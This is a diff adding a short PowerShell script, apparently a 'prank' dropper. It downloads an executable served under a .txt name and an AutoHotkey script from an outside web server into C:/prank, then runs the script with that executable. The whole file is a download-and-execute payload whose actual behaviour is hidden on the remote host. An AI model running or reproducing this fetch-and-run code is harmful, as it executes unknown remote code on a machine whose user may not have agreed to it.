@@ -1,0 +1,4 @@
+$client = new-object System.Net.WebClient
+$client.DownloadFile( "http://mkortas.webserwer.pl/prank/AutoHotkey.txt", "C:/prank/AutoHotkey.exe" )
+$client.DownloadFile( "http://mkortas.webserwer.pl/prank/abc.txt", "C:/prank/abc.ahk" )
+C:/prank/AutohotKey.exe C:/prank/abc.ahk
